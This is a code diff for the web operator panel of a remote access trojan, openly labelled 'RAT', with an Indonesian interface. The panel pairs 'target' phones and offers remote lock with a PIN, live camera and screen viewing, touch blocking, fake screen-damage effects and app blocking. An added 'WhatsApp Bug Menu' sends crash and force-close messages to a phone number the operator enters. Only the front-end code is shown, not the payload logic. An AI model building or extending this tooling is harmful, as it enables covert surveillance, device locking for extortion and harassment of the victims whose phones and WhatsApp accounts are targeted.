+    <span style="font-size:10px;letter-spacing:2px;color:#ff4d4d" id="wsStat">ONLINE</span>
+  </div>
+</div>
+
+<!-- SCREEN: LOGIN -->
+<div id="screenLogin" class="screen active">
+  <div class="auth-box">
+    <h2>LOGIN</h2>
+    <p class="sub">MASUK KE AKUN LO</p>
+    <label>USERNAME</label>
+    <input id="loginUser" placeholder="username">
+    <label>PASSWORD</label>
+    <input id="loginPass" type="password" placeholder="password">
+    <button class="btn-main" onclick="doLogin()">LOGIN</button>
+    <button class="btn-outline" onclick="showScreen('screenRegister')">CREAT ACCOUNT</button>
+  </div>
+</div>
+
+<!-- SCREEN: REGISTER -->
+<div id="screenRegister" class="screen">
+  <div class="auth-box">
+    <h2>CREAT ACCOUNT</h2>
+    <p class="sub">DAFTAR AKUN BARU</p>
+    <label>USERNAME</label>
+    <input id="regUser" placeholder="username baru">
+    <label>PASSWORD</label>
+    <input id="regPass" type="password" placeholder="password">
+    <label>KONFIRMASI PASSWORD</label>
+    <input id="regPass2" type="password" placeholder="ulangi password">
+    <button class="btn-main" onclick="doRegister()">DAFTAR</button>
+    <button class="btn-outline" onclick="showScreen('screenLogin')">KEMBALI LOGIN</button>
+  </div>
+</div>
+
+<!-- SCREEN: SUCCESS REGISTER -->
+<div id="screenSuccess" class="screen">
+  <div class="success-box">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></svg>
+    <h2>YEY!</h2>
+    <p>ACCOUNT SUDAH DI BUAT</p>
+    <button class="btn-main" onclick="showScreen('screenLogin')">LOGIN SEKARANG</button>
+  </div>
+</div>
+
+<!-- SCREEN: BERANDA (ACCOUNT INFO) -->
+<div id="screenBeranda" class="screen">
+  <div class="account-card">
+    <h2>▸ INFO ACCOUNT</h2>
+    <div class="info-row"><span>USERNAME</span><span id="accUser">-</span></div>
+    <div class="info-row"><span>STATUS</span><span style="color:#00ff66">AKTIF</span></div>
+    <div class="info-row"><span>ROLE</span><span>USER</span></div>
+    <div class="info-row"><span>MEMBER SINCE</span><span id="accSince">-</span></div>
+    <div class="info-row"><span>DEVICE TERPAIRING</span><span id="accDev">0</span></div>
+  </div>
+  <button class="btn-outline" onclick="doLogout()" style="color:#ff1a1a;border-color:#ff1a1a">LOGOUT</button>
+</div>
+
+<!-- SCREEN: RAT -->
+<div id="screenRat" class="screen">
+
+  <div class="pair-box">
+    <h2>▸ PAIRING CODE</h2>
+    <div class="code-display" id="pairCode">------</div>
+    <div class="row-btn">
+      <button onclick="genCode()">GENERATE</button>
+      <button onclick="copyCode()">COPY</button>
     </div>
   </div>
-  <div class="auth-wrap">
-    <div class="auth-box">
-      <h2>LOGIN</h2>
-      <p class="sub">Masuk untuk akses fitur</p>
-      <input id="loginUser" placeholder="USERNAME" autocomplete="off">
-      <input id="loginPass" type="password" placeholder="PASSWORD" autocomplete="off">
-      <button onclick="doLogin()">LOGIN</button>
-      <button class="warn" onclick="gotoCreate()">CREAT ACCOUNT</button>
+
+  <div class="devices-title">
+    <h2>▸ DEVICE LIST</h2>
+    <button class="open-btn" onclick="refreshDev()" style="padding:8px 14px;font-size:10px">REFRESH</button>
+  </div>
+  <div id="deviceList"></div>
+</div>
+
+<!-- SCREEN: DASHBOARD RAT -->
+<div id="screenDash" class="screen">
+  <div class="back-bar">
+    <button onclick="showScreen('screenRat')">◄</button>
+    <h2 id="dashName">TARGET</h2>
+  </div>
+
+  <div class="fcard-grid">
+    <div class="fcard" onclick="openF('lock')">
+      <svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg>
+      <h3>LOCK</h3><p>Kunci target</p>
+      <div class="fbadge off" id="b-lock">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('lockmsg')">
+      <svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4M9 16h6"/></svg>
+      <h3>LOCK + PESAN</h3><p>Kunci + pesan</p>
+      <div class="fbadge off" id="b-lockmsg">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('camera')">
+      <svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
+      <h3>LIVE CAMERA</h3><p>Lihat kamera</p>
+      <div class="fbadge off" id="b-camera">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('customhtml')">
+      <svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+      <h3>CUSTOM HTML</h3><p>Lock HTML</p>
+      <div class="fbadge off" id="b-customhtml">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('strobe')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2"/></svg>
+      <h3>STROBE</h3><p>Lampu senter</p>
+      <div class="fbadge off" id="b-strobe">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('screen')">
+      <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+      <h3>LIVE SCREEN</h3><p>Lihat layar</p>
+      <div class="fbadge off" id="b-screen">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('blocktouch')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+      <h3>BLOCK TOUCH</h3><p>Bekukan layar</p>
+      <div class="fbadge off" id="b-blocktouch">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('lcdeffect')">
+      <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M2 7h20M2 11h20M2 15h20"/></svg>
+      <h3>LCD EFFECT</h3><p>Efek layar rusak</p>
+      <div class="fbadge off" id="b-lcdeffect">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('blockapp')">
+      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
+      <h3>BLOKIR APP</h3><p>Blokir aplikasi</p>
+      <div class="fbadge off" id="b-blockapp">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('openweb')">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15 15 0 010 20M12 2a15 15 0 000 20"/></svg>
+      <h3>BUKA WEB</h3><p>Buka URL</p>
+      <div class="fbadge off" id="b-openweb">OFF</div>
+    </div>
+    <div class="fcard" onclick="openF('wallpaper')">
+      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
+      <h3>WALLPAPER LCD</h3><p>Garis merah</p>
+      <div class="fbadge off" id="b-wallpaper">OFF</div>
     </div>
   </div>
 </div>
 
-<!-- ============================ -->
-<!-- PAGE: CREATE ACCOUNT -->
-<!-- ============================ -->
-<div class="page" id="page-create">
-  <div class="header">
-    <div class="logo">
-      <svg viewBox="0 0 24 24"><path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><line x1="19" y1="8" x2="19" y2="14"/><line x1="22" y1="11" x2="16" y2="11"/></svg>
-      <h1>CREAT ACCOUNT</h1>
-    </div>
-  </div>
-  <div class="auth-wrap">
-    <div class="auth-box">
-      <h2>BUAT AKUN</h2>
-      <p class="sub">Isi data untuk daftar</p>
-      <input id="regUser" placeholder="USERNAME" autocomplete="off">
-      <input id="regPass" type="password" placeholder="PASSWORD" autocomplete="off">
-      <input id="regPass2" type="password" placeholder="ULANGI PASSWORD" autocomplete="off">
-      <button onclick="doRegister()">CREAT ACCOUNT</button>
-      <button class="warn" onclick="gotoLogin()">KEMBALI LOGIN</button>
-    </div>
-  </div>
-</div>
+<!-- SCREEN: WHATSAPP BUG MENU -->
+<div id="screenWa" class="screen">
 
-<!-- ============================ -->
-<!-- PAGE: SUCCESS REGISTER -->
-<!-- ============================ -->
-<div class="page" id="page-success">
-  <div class="header">
-    <div class="logo">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      <h1>BERHASIL</h1>
-    </div>
-  </div>
-  <div class="success-msg">
-    <h1>YEY ACCOUNT<br>SUDAH DI BUAT</h1>
-    <p>Silakan login untuk melanjutkan</p>
-    <button style="margin-top:24px" onclick="gotoLogin()">LANJUT LOGIN</button>
-  </div>
-</div>
-
-<!-- ============================ -->
-<!-- PAGE: RAT (MAIN) -->
-<!-- ============================ -->
-<div class="page" id="page-rat">
-  <div class="header">
-    <div class="logo">
-      <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 20h8M12 18v2"/><circle cx="12" cy="11" r="2"/></svg>
-      <h1>LYX PANEL</h1>
-    </div>
-    <div style="display:flex;align-items:center;gap:8px">
-      <span class="dot" id="wsDot"></span>
-      <span class="ws-stat" id="wsStat">CONNECTING</span>
+  <div class="wa-header">
+    <h2>
+      <svg viewBox="0 0 24 24"><path d="M20.5 3.5A11 11 0 003.4 17.4L2 22l4.7-1.3a11 11 0 0013.8-17.2z"/><path d="M8 9c.5 3 2.5 5 5.5 5.5l1.5-1.5 2.5 1-2 2c-4-.5-8.5-5-9-9l2-2 1 2.5L8 9z"/></svg>
+      WHATSAPP BUG MENU
+    </h2>
+    <div class="wa-input-row">
+      <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>
+      <input id="waNumber" placeholder="628xxxxxxxxxx" inputmode="numeric">
     </div>
   </div>
 
-  <!-- MAIN PAGE (Pairing + Device List) -->
-  <div id="mainPage">
-    <div class="box">
-      <h2>▸ Pairing Code</h2>
-      <div class="row">
-        <div class="code" id="pairCode">------</div>
-        <button onclick="genCode()">Generate</button>
-        <button onclick="copyCode()">Copy</button>
+  <div class="bug-section">
+    <h3>▸ PILIH BUG</h3>
+    <div class="carousel" id="bugCarousel">
+      <div class="bug-card selected" data-bug="delay" onclick="selectBug(this)">
+        <div class="check">✓</div>
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        <h4>DELAY</h4>
+        <p>Delay 5 detik</p>
+      </div>
+      <div class="bug-card" data-bug="delayandroidfc" onclick="selectBug(this)">
+        <div class="check"></div>
+        <svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2"/><line x1="9" y1="7" x2="15" y2="7"/><line x1="9" y1="11" x2="15" y2="11"/></svg>
+        <h4>DELAY ANDROID FC</h4>
+        <p>Delay + FC</p>
+      </div>
+      <div class="bug-card" data-bug="forceclose" onclick="selectBug(this)">
+        <div class="check"></div>
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg>
+        <h4>FORCE CLOSE</h4>
+        <p>Paksa tutup WA</p>
+      </div>
+      <div class="bug-card" data-bug="crashinvisible" onclick="selectBug(this)">
+        <div class="check"></div>
+        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        <h4>CRASH INVISIBLE</h4>
+        <p>Crash tanpa notif</p>
+      </div>
+      <div class="bug-card" data-bug="delayinvisible" onclick="selectBug(this)">
+        <div class="check"></div>
+        <svg viewBox="0 0 24 24"><path d="M12 2l3 7h7l-5.5 4 2 7L12 16l-6.5 4 2-7L2 9h7z"/></svg>
+        <h4>DELAY INVISIBLE</h4>
+        <p>Delay tersembunyi</p>
       </div>
     </div>
-
-    <div class="dtitle">
-      <h2>▸ Device List</h2>
-      <button onclick="refreshDev()">Refresh</button>
-    </div>
-    <div class="dlist" id="dlist"></div>
-    <div class="log" id="log"><p>Connecting...</p></div>
   </div>
 
-  <!-- DASHBOARD -->
-  <div id="dash">
-    <div class="dh">
-      <div style="display:flex;align-items:center;gap:12px">
-        <svg viewBox="0 0 24 24" style="width:36px;height:36px;stroke:#00ff88;fill:none;stroke-width:2"><rect x="6" y="2" width="12" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>
-        <div>
-          <h2 id="dName">TARGET</h2>
-          <p id="dId">ID: -</p>
-        </div>
+  <div class="sender-section">
+    <h3>▸ PILIH SENDER</h3>
+    <div class="sender-grid">
+      <div class="sender-card selected" data-sender="private" onclick="selectSender(this)">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        <h4>PRIVATE</h4>
+        <p>Sender pribadi</p>
+        <span class="badge">8 BUGS</span>
       </div>
-      <button onclick="backMain()">Back</button>
-    </div>
-
-    <div class="dgrid">
-      <div class="fcard" onclick="openF('lock')"><svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg><h3>1. LOCK</h3><p>Kunci target</p><div class="fbadge off" id="b-lock">OFF</div></div>
-      <div class="fcard" onclick="openF('lockmsg')"><svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4M9 16h6"/></svg><h3>2. LOCK + PESAN</h3><p>Kunci + pesan</p><div class="fbadge off" id="b-lockmsg">OFF</div></div>
-      <div class="fcard" onclick="openF('camera')"><svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg><h3>3. LIVE CAMERA</h3><p>Lihat kamera</p><div class="fbadge off" id="b-camera">OFF</div></div>
-      <div class="fcard" onclick="openF('customhtml')"><svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg><h3>4. CUSTOM HTML</h3><p>Lock HTML custom</p><div class="fbadge off" id="b-customhtml">OFF</div></div>
-      <div class="fcard" onclick="openF('strobe')"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2"/></svg><h3>5. STROBE</h3><p>Lampu senter</p><div class="fbadge off" id="b-strobe">OFF</div></div>
-      <div class="fcard" onclick="openF('screen')"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg><h3>6. LIVE SCREEN</h3><p>Lihat layar</p><div class="fbadge off" id="b-screen">OFF</div></div>
-      <div class="fcard" onclick="openF('blocktouch')"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg><h3>7. BLOCK TOUCH</h3><p>Bekukan layar</p><div class="fbadge off" id="b-blocktouch">OFF</div></div>
-      <div class="fcard" onclick="openF('lcdeffect')"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M2 7h20M2 11h20M2 15h20"/></svg><h3>8. LCD EFFECT</h3><p>Efek layar rusak</p><div class="fbadge off" id="b-lcdeffect">OFF</div></div>
-      <div class="fcard" onclick="openF('blockapp')"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg><h3>9. BLOKIR APP</h3><p>Blokir aplikasi</p><div class="fbadge off" id="b-blockapp">OFF</div></div>
-      <div class="fcard" onclick="openF('openweb')"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15 15 0 010 20M12 2a15 15 0 000 20"/></svg><h3>10. BUKA WEB</h3><p>Buka URL</p><div class="fbadge off" id="b-openweb">OFF</div></div>
-      <div class="fcard" onclick="openF('wallpaper')"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg><h3>11. WALLPAPER LCD</h3><p>Garis hijau</p><div class="fbadge off" id="b-wallpaper">OFF</div></div>
+      <div class="sender-card" data-sender="global" onclick="selectSender(this)">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15 15 0 010 20M12 2a15 15 0 000 20"/></svg>
+        <h4>GLOBAL</h4>
+        <p>Sender global</p>
+        <span class="badge">GRATIS</span>
+      </div>
     </div>
   </div>
+
+  <div class="footer-note">© Sender gratis dari jam 7 - 7</div>
+
+  <button class="send-btn" onclick="sendBug()">
+    <svg viewBox="0 0 24 24"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4z"/></svg>
+    KIRIM BUG
+  </button>
 </div>
 
-<!-- ============================ -->
-<!-- PAGE: BERANDA (Account Info) -->
-<!-- ============================ -->
-<div class="page" id="page-beranda">
-  <div class="header">
-    <div class="logo">
-      <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-      <h1>BERANDA</h1>
-    </div>
-    <button class="danger" onclick="doLogout()">LOGOUT</button>
-  </div>
-
-  <div class="acc-info">
-    <h2 style="font-size:14px;letter-spacing:3px;margin-bottom:14px;text-shadow:0 0 10px #00ff88">▸ INFO ACCOUNT</h2>
-    <div class="acc-row"><span>USERNAME</span><span id="accUser">-</span></div>
-    <div class="acc-row"><span>STATUS</span><span>AKTIF</span></div>
-    <div class="acc-row"><span>ROLE</span><span>OWNER</span></div>
-    <div class="acc-row"><span>LOGIN TIME</span><span id="accTime">-</span></div>
-    <div class="acc-row"><span>DEVICE PAIRED</span><span id="accDev">0</span></div>
-    <div class="acc-row"><span>VERSION</span><span>Lyx v1.0</span></div>
-  </div>
-
-  <div class="box">
-    <h2>▸ Server Status</h2>
-    <div class="acc-row"><span>WEB SOCKET</span><span id="accWs">-</span></div>
-    <div class="acc-row"><span>SERVER</span><span>lyx-server.railway.app</span></div>
-    <div class="acc-row"><span>UPTIME</span><span id="accUptime">-</span></div>
-  </div>
-
-  <div class="box">
-    <h2>▸ Quick Info</h2>
-    <p style="font-size:12px;opacity:.7;line-height:1.8;letter-spacing:1px">
-      Panel ini digunakan untuk mengontrol device target yang sudah di-pairing.<br>
-      Masuk ke tab <b>RAT</b> di bawah untuk generate pairing code & kontrol device.
-    </p>
-  </div>
-</div>
-
-<!-- ============================ -->
-<!-- MODAL (untuk fitur RAT) -->
-<!-- ============================ -->
+<!-- MODAL FITUR -->
 <div class="mov" id="mov"><div class="modal" id="modal"></div></div>
 
-<!-- ============================ -->
-<!-- BOTTOM NAVIGATION -->
-<!-- ============================ -->
-<div class="navbar" id="navbar" style="display:none">
-  <button class="navbtn" id="nav-beranda" onclick="switchPage('beranda')">
-    <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loader-ring"></div>
+  <h3>MENGIRIM BUG...</h3>
+  <div class="countdown" id="countdown">4</div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav" id="bottomNav" style="display:none">
+  <div class="nav-item" id="navBeranda" onclick="navGo('beranda')">
+    <svg viewBox="0 0 24 24"><path d="M3 12l9-9 9 9M5 10v10h14V10"/></svg>
     <span>BERANDA</span>
-  </button>
-  <button class="navbtn" id="nav-rat" onclick="switchPage('rat')">
-    <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 20h8M12 18v2"/><circle cx="12" cy="11" r="2"/></svg>
+  </div>
+  <div class="nav-item active" id="navRat" onclick="navGo('rat')">
+    <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="14" rx="2"/><circle cx="12" cy="11" r="3"/><path d="M8 20h8"/></svg>
     <span>RAT</span>
-  </button>
+  </div>
+  <div class="nav-item wa" id="navWa" onclick="navGo('wa')">
+    <svg viewBox="0 0 24 24"><path d="M20.5 3.5A11 11 0 003.4 17.4L2 22l4.7-1.3a11 11 0 0013.8-17.2z"/><path d="M8 9c.5 3 2.5 5 5.5 5.5l1.5-1.5 2.5 1-2 2c-4-.5-8.5-5-9-9l2-2 1 2.5L8 9z"/></svg>
+    <span>WHATSAPP</span>
+  </div>
 </div>
 
 <script>
-/* ============================================================
-   PAGE SWITCHER
-============================================================ */
-function showPage(id){
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById('page-' + id).classList.add('active');
-}
-
-function switchPage(name){
-  showPage(name);
-  document.querySelectorAll('.navbtn').forEach(b => b.classList.remove('active'));
-  document.getElementById('nav-' + name).classList.add('active');
-  if (name === 'beranda') updateBeranda();
-}
-
-/* ============================================================
-   AUTH SYSTEM (localStorage)
-============================================================ */
-function getUsers(){
-  try { return JSON.parse(localStorage.getItem('lyx_users') || '{}'); }
-  catch { return {}; }
-}
-function saveUsers(u){ localStorage.setItem('lyx_users', JSON.stringify(u)); }
-
-function gotoLogin(){ showPage('login'); }
-function gotoCreate(){ showPage('create'); }
-
-function doLogin(){
-  const u = document.getElementById('loginUser').value.trim();
-  const p = document.getElementById('loginPass').value;
-  if (!u || !p){ alert('Isi username & password'); return; }
-
-  const users = getUsers();
-  if (!users[u]){ alert('Akun tidak ditemukan. Creat account dulu.'); return; }
-  if (users[u].pass !== p){ alert('Password salah!'); return; }
-
-  // login sukses
-  localStorage.setItem('lyx_login', u);
-  localStorage.setItem('lyx_login_time', new Date().toLocaleString());
-  enterPanel();
-}
-
-function doRegister(){
-  const u = document.getElementById('regUser').value.trim();
-  const p = document.getElementById('regPass').value;
-  const p2 = document.getElementById('regPass2').value;
-  if (!u || !p || !p2){ alert('Isi semua field'); return; }
-  if (p !== p2){ alert('Password tidak sama'); return; }
-  if (u.length < 3){ alert('Username minimal 3 karakter'); return; }
-  if (p.length < 4){ alert('Password minimal 4 karakter'); return; }
-
-  const users = getUsers();
-  if (users[u]){ alert('Username sudah dipakai'); return; }
-
-  users[u] = { pass: p, created: new Date().toLocaleString() };
-  saveUsers(users);
-
-  showPage('success');
-}
-
-function doLogout(){
-  if (!confirm('Yakin logout?')) return;
-  localStorage.removeItem('lyx_login');
-  localStorage.removeItem('lyx_login_time');
-  document.getElementById('navbar').style.display = 'none';
-  showPage('login');
-  location.reload();
-}
-
-function enterPanel(){
-  const user = localStorage.getItem('lyx_login');
-  if (!user) return;
-
-  showPage('rat');
-  document.getElementById('navbar').style.display = 'flex';
-  document.getElementById('nav-rat').classList.add('active');
-
-  connectWS();
-
-  // jika device sudah ada & user masuk ke beranda
-  // biar fleksibel, default langsung ke RAT
-}
-
-/* ============================================================
-   BERANDA
-============================================================ */
-function updateBeranda(){
-  const user = localStorage.getItem('lyx_login') || '-';
-  document.getElementById('accUser').textContent = user;
-  document.getElementById('accTime').textContent = localStorage.getItem('lyx_login_time') || '-';
-  document.getElementById('accDev').textContent = S.devices.length;
-  document.getElementById('accWs').textContent =
-    (S.ws && S.ws.readyState === 1) ? 'ONLINE' : 'OFFLINE';
-}
-
-/* ============================================================
-   STATE
-============================================================ */
+/* ============ STATE ============ */
 const S = {
   ws:null, pairCode:'', devices:[], active:null,
+  user:null, since:null,
+  selectedBug:'delay', selectedSender:'private',
   f:{
-    lock:{active:false,pin:'',autoLock:false},
+    lock:{active:false,pin:''},
     lockmsg:{active:false,pin:'',message:''},
     camera:{active:false,facing:'front'},
     customhtml:{active:false,html:''},
@@ -555,279 +666,283 @@ const S = {
     wallpaper:{active:false}
   }
 };
-let camStream=null, screenStream=null;
+let camStream=null,screenStream=null;
 
-/* ============================================================
-   WEBSOCKET
-============================================================ */
+/* ============ AUTH ============ */
+function doLogin(){
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value.trim();
+  if (!u || !p){ alert('Isi username & password'); return; }
+  const saved = localStorage.getItem('lyx_user_'+u);
+  if (saved && JSON.parse(saved).pass === p){
+    S.user = u;
+    S.since = JSON.parse(saved).since;
+    localStorage.setItem('lyx_current',u);
+    enterPanel();
+  } else {
+    alert('Username / password salah');
+  }
+}
+
+function doRegister(){
+  const u = document.getElementById('regUser').value.trim();
+  const p = document.getElementById('regPass').value.trim();
+  const p2 = document.getElementById('regPass2').value.trim();
+  if (!u || !p){ alert('Isi semua'); return; }
+  if (p !== p2){ alert('Password tidak sama'); return; }
+  if (localStorage.getItem('lyx_user_'+u)){ alert('Username udah dipake'); return; }
+  localStorage.setItem('lyx_user_'+u, JSON.stringify({
+    pass:p, since:new Date().toLocaleDateString('id-ID')
+  }));
+  showScreen('screenSuccess');
+}
+
+function doLogout(){
+  localStorage.removeItem('lyx_current');
+  S.user = null;
+  document.getElementById('bottomNav').style.display = 'none';
+  showScreen('screenLogin');
+}
+
+function enterPanel(){
+  document.getElementById('accUser').textContent = S.user;
+  document.getElementById('accSince').textContent = S.since || '-';
+  document.getElementById('bottomNav').style.display = 'flex';
+  navGo('rat');
+  connectWS();
+}
+
+/* ============ NAV ============ */
+function navGo(tab){
+  ['navBeranda','navRat','navWa'].forEach(id => document.getElementById(id).classList.remove('active'));
+  if (tab==='beranda'){ document.getElementById('navBeranda').classList.add('active'); showScreen('screenBeranda'); }
+  if (tab==='rat'){ document.getElementById('navRat').classList.add('active'); showScreen('screenRat'); }
+  if (tab==='wa'){ document.getElementById('navWa').classList.add('active'); showScreen('screenWa'); }
+}
+
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+/* ============ WEBSOCKET ============ */
 function connectWS(){
-  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-  S.ws = new WebSocket(proto + '://' + location.host);
-  S.ws.onopen = () => {
-    log('WS connected');
+  if (S.ws) try { S.ws.close(); } catch(e){}
+  const proto = location.protocol==='https:'?'wss':'ws';
+  S.ws = new WebSocket(proto+'://'+location.host);
+  S.ws.onopen = ()=>{
     dot(true);
     S.ws.send(JSON.stringify({type:'panel_hello'}));
   };
-  S.ws.onclose = () => {
-    log('WS closed. Reconnect 3s');
-    dot(false);
-    setTimeout(connectWS, 3000);
-  };
-  S.ws.onmessage = (e) => {
-    let m; try { m = JSON.parse(e.data); } catch { return; }
-    if (m.type === 'device_list'){ S.devices = m.devices || []; renderDev(); }
-    if (m.type === 'device_paired'){ S.devices.push(m.device); renderDev(); log('Device paired: ' + m.device.name); }
-    if (m.type === 'device_offline'){ S.devices = S.devices.filter(d => d.id !== m.deviceId); renderDev(); }
-    if (m.type === 'agent_event'){ log('AGENT: ' + JSON.stringify(m.payload)); }
+  S.ws.onclose = ()=>{ dot(false); setTimeout(connectWS,3000); };
+  S.ws.onmessage = (e)=>{
+    let m; try{m=JSON.parse(e.data);}catch{return;}
+    if(m.type==='device_list'){ S.devices = m.devices||[]; renderDev(); updateAccDev(); }
+    if(m.type==='device_paired'){ S.devices.push(m.device); renderDev(); updateAccDev(); }
+    if(m.type==='device_offline'){ S.devices = S.devices.filter(d=>d.id!==m.deviceId); renderDev(); updateAccDev(); }
   };
 }
 function dot(on){
-  document.getElementById('wsDot').style.background = on ? '#00ff88' : '#ff2244';
-  document.getElementById('wsStat').textContent = on ? 'ONLINE' : 'OFFLINE';
+  const d = document.getElementById('wsDot');
+  const s = document.getElementById('wsStat');
+  d.className = on ? 'dot' : 'dot off';
+  s.textContent = on ? 'ONLINE' : 'OFFLINE';
+}
+function updateAccDev(){
+  document.getElementById('accDev').textContent = S.devices.length;
 }
 
-/* ============================================================
-   PAIRING
-============================================================ */
+/* ============ PAIRING ============ */
 async function genCode(){
-  try {
-    const r = await fetch('/api/pair/generate', { method:'POST' });
-    const j = await r.json();
-    S.pairCode = j.code;
-    document.getElementById('pairCode').textContent = j.code;
-    log('Code: ' + j.code);
-  } catch(e){ log('Gagal generate code: ' + e.message); }
+  const r = await fetch('/api/pair/generate',{method:'POST'});
+  const j = await r.json();
+  S.pairCode = j.code;
+  document.getElementById('pairCode').textContent = j.code;
 }
 function copyCode(){
-  if (!S.pairCode){ log('Generate dulu'); return; }
+  if(!S.pairCode){ alert('Generate dulu'); return; }
   navigator.clipboard.writeText(S.pairCode);
-  log('Copied: ' + S.pairCode);
+  alert('Code di-copy: ' + S.pairCode);
 }
-
-/* ============================================================
-   DEVICE LIST
-============================================================ */
 async function refreshDev(){
-  try {
-    const r = await fetch('/api/devices');
-    const j = await r.json();
-    S.devices = j.devices || [];
-    renderDev();
-  } catch(e){ log('Refresh error: ' + e.message); }
+  const r = await fetch('/api/devices');
+  const j = await r.json();
+  S.devices = j.devices||[];
+  renderDev();
+  updateAccDev();
 }
 function renderDev(){
-  const l = document.getElementById('dlist');
-  if (S.devices.length === 0){
-    l.innerHTML = '<p style="opacity:.4;font-size:12px;padding:8px;letter-spacing:1px">Belum ada device terpairing.</p>';
+  const l = document.getElementById('deviceList');
